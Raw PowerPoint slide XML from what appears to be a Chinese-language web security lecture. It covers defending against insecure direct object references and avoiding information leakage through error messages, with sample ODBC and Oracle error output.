              <a:t>配置不合理，攻击者就可以不经授权地操作这些暴露的内部对象。</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1827">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4618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18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1827">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="13" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4618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18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1827">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="19" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4618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18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1827">
                                            <p:txEl>
                                              <p:pRg st="3" end="3"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="25" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4618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18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1827">
                                            <p:txEl>
                                              <p:pRg st="4" end="4"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="31" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4618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18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61827">
                                            <p:txEl>
                                              <p:pRg st="5" end="5"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="37" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4618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618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61827">
                                            <p:txEl>
                                              <p:pRg st="6" end="6"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="43" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="46182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618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r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>、防御不安全的直接对象引用</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="463875" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1409700"/>
            <a:ext cx="8229600" cy="3562350"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>锁定</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>目录</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>。使得通过网络访问</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>服务器的用户都不能访问除专门用于存放</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>内容的目录以外的目录；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>对于每一次对象引用都要</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>重新验证授权</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>禁止通过参数暴露</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>内部对象；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>建议使用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>间接映射</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>的方法取代简单的直接对象引用，比如：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="463876" name="Text Box 4"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="971550" y="5254625"/>
            <a:ext cx="7315200" cy="466725"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFF99"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="50000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>http://www.example.com/application?file=1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" b="1">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3875">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4638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38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3875">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="13" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4638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38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3875">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="19" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4638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38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3875">
                                            <p:txEl>
                                              <p:pRg st="3" end="3"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="25" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="46387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387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2" presetClass="entr" presetSubtype="1" fill="hold" grpId="0" nodeType="clickEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="30" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="463876"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="slide(fromTop)">
                                      <p:cBhvr>
                                        <p:cTn id="31" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4638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822325" y="149225"/>
            <a:ext cx="7308850" cy="792163"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="3600" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3600" dirty="0"/>
              <a:t>3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="3600" dirty="0"/>
              <a:t>、信息泄露和不当的错误处理 </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="3600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="420868"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a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Applications can unintentionally </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>leak information</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t> about their configuration, internal workings, or violate privacy through a variety of application problems. Attackers use this weakness to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>steal sensitive data or conduct more serious attacks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US">
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="420869" name="Rectangle 5"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="544513" y="131127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0868">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="blinds(horizontal)">
                                      <p:cBhvr>
                                        <p:cTn id="7" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4208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p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>、信息泄露和不当的错误处理</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="467971" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="658813" y="1429472"/>
            <a:ext cx="7772400" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>敏感信息泄露常常细微难以察觉！</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>常见的脆弱点：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>堆栈跟踪信息</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>状态信息</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>登录失败信息</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>授权信息</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>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67971">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4679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79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7971">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="13" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4679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7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7971">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="19" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4679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79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67971">
                                            <p:txEl>
                                              <p:pRg st="3" end="3"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="25" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4679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79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67971">
                                            <p:txEl>
                                              <p:pRg st="4" end="4"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="31" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4679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79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67971">
                                            <p:txEl>
                                              <p:pRg st="5" end="5"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="37" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4679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6797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r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>4</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>、不当的错误处理示例</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="468996" name="Text Box 4"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="827088" y="1495425"/>
            <a:ext cx="7200900" cy="1200150"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFF99"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Microsoft OLE DB Provider for ODBC Drivers error '80004005' </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" b="1">
              <a:solidFill>
                <a:srgbClr val="0000FF"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>[Microsoft][ODBC Microsoft Access 97 Driver] Can't open database ‘VDPROD'.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" b="1">
              <a:solidFill>
                <a:srgbClr val="0000FF"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="468997" name="Text Box 5"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="827088" y="3394075"/>
            <a:ext cx="7200900" cy="1474788"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFF99"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>java.sql.SQLException: ORA-00600: internal error code,     arguments: [ttcgnd-1], [0], [], [], [],</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" b="1">
              <a:solidFill>
                <a:srgbClr val="0000FF"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>at oracle.jdbc.dbaccess.DBError.throwSqlException (DBError.java:169) </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" b="1">
              <a:solidFill>
                <a:srgbClr val="0000FF"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>at oracle.jdbc.ttc7.TTIoer.processError (TTIoer.java:208)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" b="1">
              <a:solidFill>
                <a:srgbClr val="0000FF"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="468999" name="Text Box 7"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="147638" y="1308100"/>
            <a:ext cx="987425" cy="366713"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="15875">
            <a:noFill/>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="90000" tIns="46800" rIns="90000" bIns="46800">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>示例</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
